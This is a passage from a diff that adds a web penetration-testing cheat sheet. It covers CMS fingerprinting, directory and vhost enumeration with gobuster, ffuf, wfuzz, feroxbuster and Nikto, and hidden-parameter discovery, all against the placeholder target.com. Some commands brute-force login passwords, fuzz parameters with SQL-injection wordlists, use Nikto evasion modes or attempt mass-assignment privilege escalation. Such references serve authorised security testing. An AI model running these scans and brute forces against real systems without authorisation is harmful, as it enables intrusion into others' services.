+# Version detection
+curl -s http://target.com/RELEASE_NOTES.txt
+curl -s http://target.com/js/mage/ | grep -oP 'version: "\K[^"]+'
+```
+
+**SharePoint**
+
+```bash
+# SPScan
+python spscan.py -u http://target.com
+
+# Manual detection
+curl -s http://target.com | grep -i sharepoint
+curl -s http://target.com | grep -i "_layouts"
+curl -I http://target.com/_layouts/viewlsts.aspx
+curl -I http://target.com/_vti_bin/
+
+# Version from headers
+curl -I http://target.com | grep -i "MicrosoftSharePointTeamServices"
+curl -I http://target.com | grep -i "SPRequestGuid"
+```
+
+**Typo3**
+
+```bash
+# Detection
+curl -s http://target.com | grep -i typo3
+curl -I http://target.com/typo3/
+curl -I http://target.com/typo3conf/
+
+# Version
+curl -s http://target.com/typo3/sysext/core/Documentation/Changelog/
+```
+
+**PrestaShop**
+
+```bash
+# Detection
+curl -s http://target.com | grep -i prestashop
+curl -I http://target.com/admin-dev/
+curl -I http://target.com/modules/
+
+# Version
+curl -s http://target.com/docs/CHANGELOG.txt
+```
+
+**OpenCart**
+
+```bash
+# Detection
+curl -s http://target.com | grep -i opencart
+curl -I http://target.com/admin/
+curl -s http://target.com/index.php?route=common/home
+
+# Version
+curl -s http://target.com/admin/view/javascript/jquery/
+```
+
+## Directory/File Enumeration
+
+### Gobuster
+
+**Basic Directory Enumeration**
+
+```bash
+# Simple directory brute force
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# With specific extensions
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js
+
+# Multiple extensions
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,bak,old,sql,zip
+
+# Lowercase wordlist
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -l
+
+# Include status codes
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -s 200,204,301,302,307,401,403
+
+# Exclude status codes
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -b 404,400
+
+# Follow redirects
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -r
+
+# Custom user agent
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -a "Mozilla/5.0..."
+
+# With cookies
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -c "PHPSESSID=abc123"
+
+# Through proxy
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt --proxy http://127.0.0.1:8080
+
+# Increase threads
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 50
+
+# Timeout adjustment
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt --timeout 10s
+
+# Output to file
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -o output.txt
+
+# Recursive enumeration
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -r -d 3  # Depth 3
+```
+
+**DNS Subdomain Enumeration**
+
+```bash
+# Subdomain brute force
+gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt
+
+# With specific resolvers
+gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt -r 8.8.8.8,1.1.1.1
+
+# Show CNAMEs
+gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt -c
+
+# Wildcard handling
+gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt --wildcard
+```
+
+**VHost Enumeration**
+
+```bash
+# Virtual host discovery
+gobuster vhost -u http://target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Append domain
+gobuster vhost -u http://target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+```
+
+### Dirsearch
+
+**Basic Usage**
+
+```bash
+# Simple scan
+dirsearch -u http://target.com
+
+# Specific extensions
+dirsearch -u http://target.com -e php,html,txt,js
+
+# Multiple extensions
+dirsearch -u http://target.com -e php,txt,html,js,bak,old,sql,zip,tar,gz
+
+# Custom wordlist
+dirsearch -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+# Force extensions on every word
+dirsearch -u http://target.com -e php -f
+
+# Exclude status codes
+dirsearch -u http://target.com -x 403,404,400,500
+
+# Recursive scan
+dirsearch -u http://target.com -e php -r
+
+# Recursion depth
+dirsearch -u http://target.com -e php -r --recursion-depth=3
+
+# Thread count
+dirsearch -u http://target.com -t 50
+
+# Delay between requests
+dirsearch -u http://target.com --delay=1
+
+# Random user agent
+dirsearch -u http://target.com --random-agent
+
+# Custom user agent
+dirsearch -u http://target.com -H "User-Agent: CustomAgent"
+
+# With cookies
+dirsearch -u http://target.com -H "Cookie: session=abc123"
+
+# Custom headers
+dirsearch -u http://target.com -H "Authorization: Bearer token"
+
+# Through proxy
+dirsearch -u http://target.com --proxy=127.0.0.1:8080
+
+# Match regex
+dirsearch -u http://target.com --include-status=200-399
+
+# Plain text report
+dirsearch -u http://target.com -o output.txt
+
+# JSON report
+dirsearch -u http://target.com --format=json -o output.json
+
+# Subdirectory scan
+dirsearch -u http://target.com/admin/ -e php
+
+# Multiple URLs
+dirsearch -l urls.txt -e php
+
+# Full URL in output
+dirsearch -u http://target.com --full-url
+
+# Exclude directories
+dirsearch -u http://target.com --exclude-subdirs=images,css,js
+```
+
+**Advanced Dirsearch**
+
+```bash
+# Maximum response time
+dirsearch -u http://target.com --max-time=10
+
+# Minimum response size
+dirsearch -u http://target.com --min-response-size=100
+
+# Maximum response size
+dirsearch -u http://target.com --max-response-size=10000000
+
+# Scan with multiple extensions and recursion
+dirsearch -u http://target.com -e php,html,txt,bak -r --recursion-depth=2 -t 30
+
+# Scan with prefix/suffix
+dirsearch -u http://target.com -e php --prefixes backup,old,tmp --suffixes _old,_backup,.bak
+```
+
+### Feroxbuster
+
+**Basic Usage**
+
+```bash
+# Simple scan
+feroxbuster -u http://target.com
+
+# Custom wordlist
+feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# Extensions
+feroxbuster -u http://target.com -x php,txt,html,js
+
+# Multiple extensions
+feroxbuster -u http://target.com -x php,txt,html,js,bak,old,sql,zip
+
+# Depth
+feroxbuster -u http://target.com --depth 3
+
+# Threads
+feroxbuster -u http://target.com -t 50
+
+# Timeout
+feroxbuster -u http://target.com --timeout 10
+
+# Filter status codes
+feroxbuster -u http://target.com -C 404,403
+
+# Match status codes
+feroxbuster -u http://target.com -s 200,301,302
+
+# Filter size
+feroxbuster -u http://target.com -S 1234  # Filter responses of size 1234
+
+# Auto-filter (smart 404 detection)
+feroxbuster -u http://target.com --auto-tune
+
+# Follow redirects
+feroxbuster -u http://target.com -r
+
+# Extract links
+feroxbuster -u http://target.com --extract-links
+
+# Headers
+feroxbuster -u http://target.com -H "Cookie: session=abc" -H "User-Agent: Custom"
+
+# Proxy
+feroxbuster -u http://target.com -p http://127.0.0.1:8080
+
+# Output
+feroxbuster -u http://target.com -o output.txt
+
+# JSON output
+feroxbuster -u http://target.com --json -o output.json
+
+# Insecure SSL
+feroxbuster -u https://target.com -k
+
+# Rate limit
+feroxbuster -u http://target.com --rate-limit 50  # 50 requests/sec
+
+# Scan multiple targets
+feroxbuster --stdin < urls.txt
+
+# Resume scan
+feroxbuster -u http://target.com --resume-from state.txt
+```
+
+**Advanced Feroxbuster**
+
+```bash
+# Smart scanning with recursion and extraction
+feroxbuster -u http://target.com -x php,html,txt -t 50 --extract-links --auto-tune --depth 4
+
+# Thorough scan with filters
+feroxbuster -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak -t 30 -C 404 --auto-tune -r
+
+# Wordlist with extensions forced
+feroxbuster -u http://target.com -w wordlist.txt -x php --force-recursion
+```
+
+### FFUF (Fuzz Faster U Fool)
+
+**Directory Fuzzing**
+
+```bash
+# Basic directory fuzzing
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+# With extensions
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dir
+```
+
+
+**Directory Fuzzing with Extensions**
+
+```bash
+# Extensions in URL
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.js,.bak
+
+# Multiple wordlists
+ffuf -u http://target.com/W1.W2 -w /usr/share/wordlists/dirb/common.txt:W1 -w extensions.txt:W2
+
+# Recursive fuzzing
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -recursion -recursion-depth 2
+
+# Filter by status code
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
+
+# Filter out status codes
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404,403
+
+# Filter by response size
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 1234
+
+# Filter by word count
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fw 100
+
+# Filter by line count
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fl 20
+
+# Match regex
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mr "admin|login"
+
+# Filter regex
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fr "Not Found"
+
+# Threads
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50
+
+# Rate limit
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -rate 100
+
+# Delay between requests
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -p 0.5
+
+# Timeout
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -timeout 10
+
+# Follow redirects
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -r
+
+# Custom headers
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -H "Cookie: session=abc123"
+
+# Proxy
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -x http://127.0.0.1:8080
+
+# Output formats
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -o output.json -of json
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -o output.html -of html
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -o output.csv -of csv
+
+# Silent mode (only results)
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -s
+
+# Verbose mode
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -v
+
+# Auto-calibration (smart filtering)
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac
+```
+
+**Virtual Host Fuzzing**
+
+```bash
+# VHost discovery
+ffuf -u http://target.com -H "Host: FUZZ.target.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Filter by size to remove default vhost
+ffuf -u http://target.com -H "Host: FUZZ.target.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1234
+
+# With auto-calibration
+ffuf -u http://target.com -H "Host: FUZZ.target.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -ac
+```
+
+**Parameter Fuzzing**
+
+```bash
+# GET parameter fuzzing
+ffuf -u http://target.com/page?FUZZ=value -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+
+# POST parameter fuzzing
+ffuf -u http://target.com/page -X POST -d "FUZZ=value" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+
+# Multiple parameters
+ffuf -u http://target.com/page?param1=FUZZ1&param2=FUZZ2 -w wordlist1.txt:FUZZ1 -w wordlist2.txt:FUZZ2
+
+# JSON parameter fuzzing
+ffuf -u http://target.com/api -X POST -d '{"FUZZ":"value"}' -H "Content-Type: application/json" -w params.txt
+```
+
+**Advanced FFUF Techniques**
+
+```bash
+# Combined directory and extension fuzzing
+ffuf -u http://target.com/FUZZFILE.FUZZEXT -w /usr/share/wordlists/dirb/common.txt:FUZZFILE -w extensions.txt:FUZZEXT
+
+# Nested fuzzing (subdirectories)
+ffuf -u http://target.com/DIR/FUZZ -w dirs.txt:DIR -w files.txt:FUZZ -recursion
+
+# Match response time (timing attacks)
+ffuf -u http://target.com/FUZZ -w wordlist.txt -mt '>500'  # Responses taking more than 500ms
+
+# Complex filtering
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301 -fs 1234,5678 -fw 100 -ac
+```
+
+### WFuzz
+
+**Basic Directory Fuzzing**
+
+```bash
+# Simple fuzzing
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://target.com/FUZZ
+
+# With extensions
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -z list,php-txt-html http://target.com/FUZZ.FUZ2Z
+
+# Hide responses by status code
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://target.com/FUZZ
+
+# Show only specific codes
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --sc 200,301,302 http://target.com/FUZZ
+
+# Hide by number of characters
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hh 1234 http://target.com/FUZZ
+
+# Hide by number of words
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hw 100 http://target.com/FUZZ
+
+# Hide by number of lines
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hl 20 http://target.com/FUZZ
+
+# Threads
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -t 50 http://target.com/FUZZ
+
+# Follow redirects
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --follow http://target.com/FUZZ
+
+# Custom headers
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -H "Cookie: session=abc" http://target.com/FUZZ
+
+# Proxy
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -p 127.0.0.1:8080 http://target.com/FUZZ
+
+# Output to file
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -o output.txt http://target.com/FUZZ
+```
+
+**Advanced WFuzz**
+
+```bash
+# POST data fuzzing
+wfuzz -c -z file,wordlist.txt -d "username=admin&password=FUZZ" http://target.com/login
+
+# Multiple injection points
+wfuzz -c -z file,users.txt -z file,passwords.txt -d "username=FUZZ&password=FUZ2Z" http://target.com/login
+
+# JSON fuzzing
+wfuzz -c -z file,wordlist.txt -H "Content-Type: application/json" -d '{"param":"FUZZ"}' http://target.com/api
+
+# Header fuzzing
+wfuzz -c -z file,wordlist.txt -H "X-Custom-Header: FUZZ" http://target.com
+
+# Cookie fuzzing
+wfuzz -c -z file,wordlist.txt -b "session=FUZZ" http://target.com
+
+# User agent fuzzing
+wfuzz -c -z file,user-agents.txt -H "User-Agent: FUZZ" http://target.com
+
+# Subdomain enumeration
+wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.target.com" --hc 400,404 http://target.com
+
+# Range-based fuzzing
+wfuzz -c -z range,1-100 http://target.com/page?id=FUZZ
+
+# Baseline request for comparison
+wfuzz -c -z file,wordlist.txt --hc BBB http://target.com/FUZZ
+```
+
+### Nikto
+
+**Basic Web Server Scanning**
+
+```bash
+# Simple scan
+nikto -h http://target.com
+
+# Specific port
+nikto -h target.com -p 80,443,8080
+
+# SSL scan
+nikto -h https://target.com -ssl
+
+# Scan multiple hosts
+nikto -h targets.txt
+
+# With specific plugins
+nikto -h http://target.com -Plugins "headers,cgi"
+
+# List all plugins
+nikto -list-plugins
+
+# Tuning options (specific test categories)
+nikto -h http://target.com -Tuning x  # Reverse proxy
+nikto -h http://target.com -Tuning 123456789abc
+
+# Tuning options:
+# 1 - Interesting File / Seen in logs
+# 2 - Misconfiguration / Default File
+# 3 - Information Disclosure
+# 4 - Injection (XSS/Script/HTML)
+# 5 - Remote File Retrieval
+# 6 - Denial of Service
+# 7 - Remote File Retrieval - Server Wide
+# 8 - Command Execution / Remote Shell
+# 9 - SQL Injection
+# 0 - File Upload
+# a - Authentication Bypass
+# b - Software Identification
+# c - Remote Source Inclusion
+# x - Reverse Proxy
+
+# Custom user agent
+nikto -h http://target.com -useragent "Mozilla/5.0..."
+
+# Through proxy
+nikto -h http://target.com -useproxy http://127.0.0.1:8080
+
+# Authentication
+nikto -h http://target.com -id username:password
+
+# Virtual host
+nikto -h target.com -vhost subdomain.target.com
+
+# Output formats
+nikto -h http://target.com -o output.txt
+nikto -h http://target.com -o output.html -Format html
+nikto -h http://target.com -o output.xml -Format xml
+nikto -h http://target.com -o output.csv -Format csv
+
+# Timeout
+nikto -h http://target.com -timeout 5
+
+# No 404 checking
+nikto -h http://target.com -no404
+
+# Evasion techniques
+nikto -h http://target.com -evasion 1234567
+
+# Evasion options:
+# 1 - Random URI encoding
+# 2 - Directory self-reference
+# 3 - Premature URL ending
+# 4 - Prepend long random string
+# 5 - Fake parameter
+# 6 - TAB as request spacer
+# 7 - Change case
+# 8 - Use Windows directory separator
+
+# Maximum execution time
+nikto -h http://target.com -maxtime 30m
+
+# Update database
+nikto -update
+```
+
+### Custom Directory Enumeration
+
+**Using cURL with Wordlist**
+
+```bash
+#!/bin/bash
+# Simple directory enumeration script
+
+TARGET="http://target.com"
+WORDLIST="/usr/share/wordlists/dirb/common.txt"
+
+while read dir; do
+    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$dir")
+    if [ "$response" != "404" ]; then
+        echo "[$response] $TARGET/$dir"
+    fi
+done < "$WORDLIST"
+```
+
+**Multi-threaded with GNU Parallel**
+
+```bash
+# Directory enumeration with parallel
+cat /usr/share/wordlists/dirb/common.txt | parallel -j 50 'curl -s -o /dev/null -w "%{http_code} http://target.com/{}\n" http://target.com/{} | grep -v "404"'
+
+# With extensions
+cat wordlist.txt | parallel -j 50 'for ext in php html txt; do curl -s -o /dev/null -w "%{http_code} http://target.com/{}.${ext}\n" http://target.com/{}.${ext}; done' | grep -v "404"
+```
+
+### Wordlist Selection
+
+**Common Wordlists for Web Enumeration**
+
+```bash
+# DirBuster wordlists
+/usr/share/wordlists/dirb/common.txt
+/usr/share/wordlists/dirb/big.txt
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+# SecLists
+/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+/usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
+/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
+/usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt
+
+# CMS-specific
+/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
+/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/drupal.txt
+/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/joomla.txt
+
+# API endpoints
+/usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt
+/usr/share/wordlists/SecLists/Discovery/Web-Content/swagger.txt
+
+# Backup files
+/usr/share/wordlists/SecLists/Discovery/Web-Content/backup-files.txt
+
+# CGI files
+/usr/share/wordlists/SecLists/Discovery/Web-Content/CGIs.txt
+```
+
+**Creating Custom Wordlists**
+
+```bash
+# Extract from website content
+cewl http://target.com -m 3 -d 2 -w custom_wordlist.txt
+
+# With metadata
+cewl http://target.com -m 3 --with-numbers -w wordlist.txt
+
+# Spider depth
+cewl http://target.com -d 3 -w wordlist.txt
+
+# Combine multiple wordlists
+cat wordlist1.txt wordlist2.txt | sort -u > combined.txt
+
+# Add common extensions
+for word in $(cat wordlist.txt); do
+    echo "$word"
+    echo "$word.php"
+    echo "$word.html"
+    echo "$word.txt"
+    echo "$word.bak"
+done > wordlist_with_extensions.txt
+
+# Generate permutations
+john --wordlist=wordlist.txt --rules --stdout > permutations.txt
+```
+
+## Hidden Parameter Discovery
+
+### Parameter Brute-forcing with Arjun
+
+**Basic Usage**
+
+```bash
+# Simple parameter discovery
+arjun -u http://target.com/page
+
+# GET parameters
+arjun -u http://target.com/page -m GET
+
+# POST parameters
+arjun -u http://target.com/page -m POST
+
+# JSON parameters
+arjun -u http://target.com/api -m JSON
+
+# Custom headers
+arjun -u http://target.com/page -H "Cookie: session=abc123"
+
+# Include default parameters
+arjun -u http://target.com/page --include
+
+# Custom wordlist
+arjun -u http://target.com/page -w custom_params.txt
+
+# Threads
+arjun -u http://target.com/page -t 50
+
+# Delay between requests
+arjun -u http://target.com/page -d 0.5
+
+# Stable response detection
+arjun -u http://target.com/page --stable
+
+# Import from Burp
+arjun -i burp_requests.xml
+
+# Output JSON
+arjun -u http://target.com/page -o output.json
+
+# Passive mode (only wordlist)
+arjun -u http://target.com/page --passive
+```
+
+**Advanced Arjun**
+
+```bash
+# Multiple URLs
+arjun -i urls.txt -t 10
+
+# With authentication
+arjun -u http://target.com/page -H "Authorization: Bearer token123"
+
+# Specific detection method
+arjun -u http://target.com/page --detection-method status
+
+# Detection methods:
+# - status: Status code differences
+# - time: Response time differences
+# - length: Response length differences
+# - redirect: Redirect location differences
+```
+
+### Parameter Discovery with FFUF
+
+**GET Parameter Fuzzing**
+
+```bash
+# Basic parameter discovery
+ffuf -u "http://target.com/page?FUZZ=test" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -ac
+
+# Filter by response difference
+ffuf -u "http://target.com/page?FUZZ=test" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 1234
+
+# Multiple parameters
+ffuf -u "http://target.com/page?param1=value&FUZZ=test" -w params.txt -ac
+
+# Parameter value fuzzing
+ffuf -u "http://target.com/page?id=FUZZ" -w /usr/share/wordlists/SecLists/Fuzzing/SQLi/Generic-SQLi.txt -mc 200,500
+```
+
+**POST Parameter Fuzzing**
+
+```bash
+# POST data
+ffuf -u http://target.com/page -X POST -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -ac
+
+# Multiple POST parameters
+ffuf -u http://target.com/page -X POST -d "username=admin&FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded" -w params.txt -ac
+
+# JSON parameter discovery
+ffuf -u http://target.com/api -X POST -d '{"FUZZ":"test"}' -H "Content-Type: application/json" -w params.txt -mc 200 -ac
+
+# Nested JSON parameters
+ffuf -u http://target.com/api -X POST -d '{"user":{"FUZZ":"test"}}' -H "Content-Type: application/json" -w params.txt -ac
+```
+
+**Header Parameter Fuzzing**
+
+```bash
+# Custom header discovery
+ffuf -u http://target.com -H "FUZZ: test" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/custom-headers.txt -ac
+
+# X-headers discovery
+ffuf -u http://target.com -H "X-FUZZ: test" -w common-headers.txt -ac
+
+# Common header parameters to test
+X-Forwarded-For
+X-Forwarded-Host
+X-Original-URL
+X-Rewrite-URL
+X-Remote-IP
+X-Remote-Addr
+X-Client-IP
+```
+
+### Parameter Mining from JavaScript
+
+**Extract from JavaScript Files**
+
+```bash
+# Find JavaScript files
+curl -s http://target.com | grep -oP 'src="[^"]+\.js"' | cut -d'"' -f2
+
+# Download all JS files
+wget -r -l1 -H -t1 -nd -N -np -A.js -erobots=off http://target.com
+
+# Extract potential parameters from JS
+grep -rEoh "(param|parameter|arg|argument|key|field|id|name)[\"\']?\s*[:=]\s*[\"\']?[a-zA-Z0-9_-]+" *.js
+
+# Using regex patterns
+grep -rEoh "(\?|&)[a-zA-Z0-9_-]+=" *.js | cut -d'=' -f1 | sort -u
+
+# API endpoints from JS
+grep -rEoh "https?://[^\"'> ]+" *.js | sort -u
+
+# LinkFinder tool
+python3 linkfinder.py -i http://target.com -o results.html
+
+# With depth
+python3 linkfinder.py -i http://target.com -d -o results.html
+```
+
+**Automated JS Analysis**
+
+```bash
+# Using getJS
+getJS --url http://target.com --output js_files.txt
+
+# Download and analyze
+cat js_files.txt | while read url; do
+    curl -s "$url" | grep -Eo "(param|key|field|arg)[\"']?\s*[:=]"
+done
+
+# JSParser
+python3 jsparser.py -u http://target.com
+
+# SecretFinder
+python3 SecretFinder.py -i http://target.com -o findings.html
+
+# Relative-url-extractor
+python3 relative-url-extractor.py http://target.com
+```
+
+### Param Miner (Burp Extension Alternative - CLI)
+
+**Manual Parameter Mining**
+
+```bash
+# Guess common parameter names
+common_params=(
+    "id" "page" "redirect" "url" "callback" "return"
+    "next" "ref" "file" "path" "folder" "document"
+    "debug" "test" "admin" "user" "username" "email"
+    "token" "key" "api_key" "access_token" "session"
+    "cmd" "command" "exec" "query" "search" "q"
+    "data" "input" "output" "format" "type" "action"
+)
+
+for param in "${common_params[@]}"; do
+    response=$(curl -s -o /dev/null -w "%{http_code}" "http://target.com/page?$param=test")
+    baseline=$(curl -s -o /dev/null -w "%{http_code}" "http://target.com/page")
+    if [ "$response" != "$baseline" ]; then
+        echo "Potential parameter found: $param"
+    fi
+done
+```
+
+**Differential Analysis Script**
+
+```bash
+#!/bin/bash
+# Parameter discovery via response comparison
+
+URL="http://target.com/page"
+WORDLIST="/usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt"
+
+# Get baseline
+baseline_size=$(curl -s "$URL" | wc -c)
+baseline_code=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
+
+echo "Baseline: $baseline_code ($baseline_size bytes)"
+
+while read param; do
+    test_url="${URL}?${param}=test"
+    response_code=$(curl -s -o /dev/null -w "%{http_code}" "$test_url")
+    response_size=$(curl -s "$test_url" | wc -c)
+    
+    # Check for differences
+    if [ "$response_code" != "$baseline_code" ] || [ "$response_size" != "$baseline_size" ]; then
+        echo "[+] Param: $param | Code: $response_code | Size: $response_size"
+    fi
+done < "$WORDLIST"
+```
+
+### HTTP Parameter Pollution (HPP) Testing
+
+**Duplicate Parameter Testing**
+
+```bash
+# Test with duplicate parameters
+curl "http://target.com/page?id=1&id=2"
+curl "http://target.com/page?id=1&id=2&id=3"
+
+# Different values
+curl "http://target.com/page?email=user@example.com&email=admin@example.com"
+
+# With special characters
+curl "http://target.com/page?param=value1&param=value2%00value3"
+
+# Array-style parameters
+curl "http://target.com/page?id[]=1&id[]=2"
+curl "http://target.com/page?id[0]=1&id[1]=2"
+```
+
+**Testing Parameter Precedence**
+
+```bash
+# URL encoding variations
+curl "http://target.com/page?param=value1&param=value2"
+curl "http://target.com/page?param=value1&PARAM=value2"
+curl "http://target.com/page?param=value1&param%3D=value2"
+
+# POST + GET combination
+curl -X POST "http://target.com/page?id=1" -d "id=2"
+
+# Different content types
+curl -X POST "http://target.com/page" -H "Content-Type: application/json" -d '{"id":"1"}' --get -d "id=2"
+```
+
+### Cookie Parameter Discovery
+
+**Cookie Fuzzing**
+
+```bash
+# Fuzz cookie names
+ffuf -u http://target.com -H "Cookie: FUZZ=test" -w cookie-names.txt -ac
+
+# Fuzz cookie values
+ffuf -u http://target.com -H "Cookie: session=FUZZ" -w values.txt -ac
+
+# Common cookie names to test
+common_cookies=(
+    "session" "sessionid" "sess" "token" "auth"
+    "user" "userid" "username" "admin" "debug"
+    "test" "dev" "tracking" "analytics" "preferences"
+)
+
+for cookie in "${common_cookies[@]}"; do
+    response=$(curl -s -H "Cookie: $cookie=test" http://target.com | wc -c)
+    echo "$cookie: $response bytes"
+done
+```
+
+### Hidden Form Field Discovery
+
+**Extract Form Fields**
+
+```bash
+# Extract all forms
+curl -s http://target.com | grep -oP '<form[^>]*>.*?</form>' | sed 's/></>\n</g'
+
+# Extract input fields
+curl -s http://target.com | grep -oP '<input[^>]+>' | grep -oP 'name="[^"]+"' | cut -d'"' -f2 | sort -u
+
+# Extract hidden fields
+curl -s http://target.com | grep -oP '<input[^>]+type="hidden"[^>]*>' | grep -oP 'name="[^"]+"'
+
+# Extract all parameter names
+curl -s http://target.com | grep -oP 'name="[^"]+"' | cut -d'"' -f2 | sort -u
+```
+
+**Test Hidden Parameters in Forms**
+
+```bash
+# Add extra parameters to form submission
+curl -X POST http://target.com/submit \
+  -d "username=admin&password=pass&debug=1&admin=true"
+
+# Test with various boolean values
+for param in debug admin test dev; do
+    curl -X POST http://target.com/submit \
+      -d "username=test&password=test&$param=1"
+done
+```
+
+### API Parameter Discovery
+
+**REST API Parameter Testing**
+
+```bash
+# Common API parameters
+api_params=(
+    "limit" "offset" "page" "per_page" "count"
+    "sort" "order" "filter" "fields" "include"
+    "exclude" "expand" "format" "pretty" "debug"
+    "callback" "jsonp" "api_key" "access_token"
+)
+
+# Test each parameter
+for param in "${api_params[@]}"; do
+    curl -s "http://target.com/api/endpoint?$param=1" | jq . 2>/dev/null
+done
+
+# Mass assignment testing
+curl -X POST http://target.com/api/user \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test","email":"test@test.com","role":"admin","isAdmin":true}'
+```
+
+**GraphQL Parameter Discovery**
+
+```bash
+# Introspection query
+curl -X POST http://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"query IntrospectionQuery { __schema { queryType { name fields { name } } } }"}'
+
+# Field suggestions
+curl -X POST http://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __type(name: \"User\") { fields { name type { name } } } }"}'
+```
+
+**Important Subtopics**
+
